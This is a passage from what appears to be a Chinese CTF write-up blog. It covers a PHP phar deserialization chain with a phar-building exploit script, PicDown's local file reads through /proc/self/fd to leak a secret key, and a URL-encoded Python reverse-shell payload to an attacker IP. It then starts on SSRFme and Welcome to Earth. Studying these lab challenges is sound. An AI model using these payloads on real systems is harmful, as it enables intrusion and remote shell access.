</span>&#123;<br>        <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; TB&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这个<code>close()</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>&#125;<br></code></pre></td></tr></table></figure><p>很明显我们可以依靠<code> return file_get_contents($this-&gt;filename)</code>去读<code>flag.php</code>或<code>flag/txt</code>之类的文件，(这道题是读<code>flag.txt</code>，为什么读这个文件可以看<code>download.php</code>的过滤内容。)</p><p>但注意这个函数是没回显的，我们要想办法把读到的结果回显出来，这时想到了刚才<code>FileList</code>下的<code>__destruct()</code>函数。但从<code>Filelist</code>类下是没法直接触发<code>__call</code>方法和<code>close()</code>的，不过：</p><p><code>User</code>类下存在<code>_destruct()</code>方法;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br><span class="hljs-comment">// 也就是说如果db=FileList类的实例，就变成了FileList-&gt;close();</span><br></code></pre></td></tr></table></figure><p>当执行<code>FileList-&gt;close()</code>时，因为FileList类中没有<code>close()</code>这个方法所以调用<code>FileList</code>-&gt;<code>_call()</code>从而遍历全文件找<code>close()</code>方法。找到了<code>File-&gt;close()</code>就执行了读取文件内容的操作<code>file_get_contents($filename)</code>并给他的结果返回<code>FileList-&gt;$results</code>,最后<code>FileList-&gt;_destruct()</code>方法输出了这个结果。</p><p><code>User中的__destruct</code> &#x3D; &gt; <code>FileList-&gt;close</code> &#x3D; &gt; <code>Filelist-&gt;__call(&#39;close&#39;)</code> &#x3D;&gt;<code>File-&gt;close(&#39;/flag.txt&#39;)</code>&#x3D; &gt;<code>$results=file_get_contents(&#39;flag.txt&#39;)</code>&#x3D;&gt;<code>FileList-&gt;_destruct()</code> &#x3D;&gt; <code>echo $result</code>。</p><p>再梳理一下这个过程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br><span class="hljs-comment">//这时我们可以令db = new Filelist()，变成$this-&gt;new Filelist -&gt;close();</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//func为close()，令$this-&gt;files[]=new File();去调用File中的close()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><span class="hljs-comment">//令$this-&gt;filename = /flag.txt,结果被存到$results这个多维数组中</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br><span class="hljs-comment">//Filelist实例化对象销毁时，触发__destruct魔术方法将结果输出</span><br></code></pre></td></tr></table></figure><p>然后注意<code>phar</code>反序列化触发条件之一是要存在一些受影响的操作数：</p><p><img src="/img/dropbox14.png" alt="dropbox14"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//File类中的open函数，这个函数在很多地方被调用</span><br></code></pre></td></tr></table></figure><p>所以存在<code>phar</code>反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>();<br>   &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;files[]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/flag.txt&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$phar</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;pharphar.phar&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>最后要注意的点就是<code>download.php</code>下存在这么个东西：</p><p><code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></p><p><img src="/img/dropbox11.png" alt="dropbox11"></p><p>所以反序列化要在<code>delate.php</code>页面下触发。</p><p><code>filename=phar://pharphar.jpg</code></p><p><img src="/img/picdown15.png" alt="picdown15"></p><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p><img src="/img/picdown1.png" alt="picdown1"></p><p>？？？</p><p><img src="/img/picdown2.png" alt="picdown2"></p><p>？？？</p><p>随便输点东西回车，注意<code>URL</code>：</p><p><img src="/img/picdown3.png" alt="picdown3"></p><p>随便输了些网站都没啥反应，想到<code>URL</code>可以利用<code>file</code>读本地文件。。但读啥也不知道。。</p><p>参考：<code>https://www.cnblogs.com/Article-kelp/p/16095712.html</code></p><p>首先得知道这题用的是<code>python2</code>的<code>urllib</code>的<code>urlopen</code>，和<code>urllib2</code>中的<code>urlopen</code>明显区别就是<code>urllib.urlopen</code>支持将路径作为参数去打开对应的本地路径，所以可以直接填入路径读取文件。</p><p>比如<code>/etc/passwd</code>这东西算是一个文件路径而不是<code>URL</code>，但仍可以通过输入路径读取文件：</p><p><img src="/img/picdonw2.png" alt="picdonw2"></p><p>接下来就是<code>proc</code>目录利用，主要就是下面这些东西：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#参考：https://www.anquanke.com/post/id/241148</span><br><span class="hljs-comment">#self代替了pid，这里指的是当前运行的进程</span><br><span class="hljs-regexp">/proc/</span>self/cmdline 启动当前进程的完整命令<br><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span> 指向当前进程的运行目录<br><span class="hljs-regexp">/proc/</span>self/exe 指向启动当前进程的可执行文件<br><span class="hljs-regexp">/proc/</span>self/environ 当前进程的环境变量列表<br><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/fd/</span> 当前进程已打开文件的文件描述符<br></code></pre></td></tr></table></figure><p><code>page?url=/proc/self/cmdline</code></p><p><img src="/img/picdown5.png" alt="picdown5"></p><p><code>page?url=/app.py</code></p><p><img src="/img/picdown6.png" alt="picdown6"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br>app = Flask(__name__)<br><br>SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br>f = <span class="hljs-built_in">open</span>(SECRET_FILE)<br>SECRET_KEY = f.read().strip()<br>os.remove(SECRET_FILE)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/page&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page</span>():<br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>            res = urllib.urlopen(url)<br>            value = res.read()<br>            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)<br>            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, res=value)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">manager</span>():<br>    key = request.args.get(<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(SECRET_KEY)<br>    <span class="hljs-keyword">if</span> key == SECRET_KEY:<br>        shell = request.args.get(<span class="hljs-string">&quot;shell&quot;</span>)<br>        os.system(shell)<br>        res = <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        res = <span class="hljs-string">&quot;Wrong Key!&quot;</span><br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure><p>主要就是<code>/no_one_know_the_manager</code>这个路由，它会判断传进来的key参数和静态变量SECRET_KEY是否相等，相等的话就使用<code>os.system()</code>方法执行传进来的shell参数(不过注意这里是没回显的)。</p><p><code>SECRET_KEY</code>获取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span> <br>f = <span class="hljs-built_in">open</span>(SECRET_FILE)       <span class="hljs-comment"># 用open()打开/tmp/secret.txt文件</span><br>SECRET_KEY = f.read().strip()      <span class="hljs-comment"># 读取secret.txt文件，将内容赋给SECRET_KEY</span><br>os.remove(SECRET_FILE) <span class="hljs-comment">#删除/tmp/secret.txt文件</span><br></code></pre></td></tr></table></figure><p>根据上面那篇文章可以知道：</p><p><strong>在 linux  系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></p><p>&#x2F;proc&#x2F;[pid]&#x2F;fd 这个目录里包含了进程打开文件的情况，目录里面有一堆&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;id文件，id就是进程记录的打开文件的文件描述符的序号。接下来可以通过手动输或者爆破去拿数据。我很懒所以直接照着<code>wp</code>里的结果尝试了。。</p><p><code>/page?url=/proc/self/fd/3</code></p><p><img src="/img/picdown7.png" alt="picdown7"></p><p>拿到<code>SECRET_KEY</code>后面就是<code>GET</code>传参<code>shell</code></p><p>后面就是反弹<code>shell</code>了。。但我的<code>VPS</code>还没弄好所以这个坑就先留着，这里用非预期读了flag：</p><p><img src="/img/picdown4.png" alt="picdown4"></p><p>2024.1.2补充：</p><p>获取密钥后反弹<code>shell</code>：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/no_one_know_the_manager?key<span class="hljs-operator">=</span>OEv<span class="hljs-number">7</span>KST<span class="hljs-number">0</span>mYwp<span class="hljs-number">7</span>AwYUjP<span class="hljs-number">3</span>wfp<span class="hljs-number">13</span>Gm/<span class="hljs-number">7</span>ais<span class="hljs-number">0</span>wOg<span class="hljs-number">150</span>wX<span class="hljs-number">8</span>I<span class="hljs-operator">=</span>&amp;shell<span class="hljs-operator">=</span>python -<span class="hljs-keyword">c</span> &#x27;import socket<span class="hljs-variable">%2</span>Csubprocess<span class="hljs-variable">%2</span>Cos<span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>Dsocket.socket(socket.AF_INET<span class="hljs-variable">%2</span>Csocket.SOCK_STREAM)<span class="hljs-variable">%3</span>Bs.connect((<span class="hljs-string">&quot;IP地址&quot;</span><span class="hljs-variable">%2</span>C<span class="hljs-number">9001</span>))<span class="hljs-variable">%3</span>Bos.dup<span class="hljs-number">2</span>(s.fileno()<span class="hljs-variable">%2</span>C<span class="hljs-number">0</span>)<span class="hljs-variable">%3</span>B os.dup<span class="hljs-number">2</span>(s.fileno()<span class="hljs-variable">%2</span>C<span class="hljs-number">1</span>)<span class="hljs-variable">%3</span>Bos.dup<span class="hljs-number">2</span>(s.fileno()<span class="hljs-variable">%2</span>C<span class="hljs-number">2</span>)<span class="hljs-variable">%3</span>Bimport pty<span class="hljs-variable">%3</span>B pty.spawn(<span class="hljs-string">&quot;%2Fbin%2Fbash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p><code>ls</code>后<code>cat /flag</code>就行，注意反弹命令要<code>URL</code>编码一下</p><p><img src="/img/fantanshell.png" alt="fantanshell"></p><h2 id="HITCON-2017-SSRFme-未做完"><a href="#HITCON-2017-SSRFme-未做完" class="headerlink" title="[HITCON 2017]SSRFme(未做完)"></a>[HITCON 2017]SSRFme(未做完)</h2><p><img src="/img/hihtssrfme1.png" alt="hihtssrfme1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$http_x_headers</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>        <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$http_x_headers</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>    <span class="hljs-comment">//HTTP_X_FORWARDED_FOR可以伪造</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]; <span class="hljs-comment">//10.244.80.12</span><br><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&quot;sandbox/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<span class="hljs-comment">//MD5加密</span><br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//创建目录</span><br>    @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//切换至目录</span><br><br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;GET &quot;</span> . <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]));<br>    <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br>    <span class="hljs-variable">$dir</span>  = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;dirname&quot;</span>]));<span class="hljs-comment">//把文件名中的.换成空</span><br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>    @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$dir</span>);<br>    @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;basename&quot;</span>]), <span class="hljs-variable">$data</span>);<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>)<br></code></pre></td></tr></table></figure><p>代码很好理解，主要有这么个东西：</p><p><code>$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</code></p><p><code>shell_exec</code>执行的参数是<code>GET</code>+<code>url</code>经过转义的值。。题还是做的太少了，<code>GET</code>命令第一次碰到，搜了搜GET命令执行漏洞</p><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>这题页面刷新的很快就抓包看了。。</p><p><img src="/img/welcometoearth1.png" alt="welcometoearth1"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 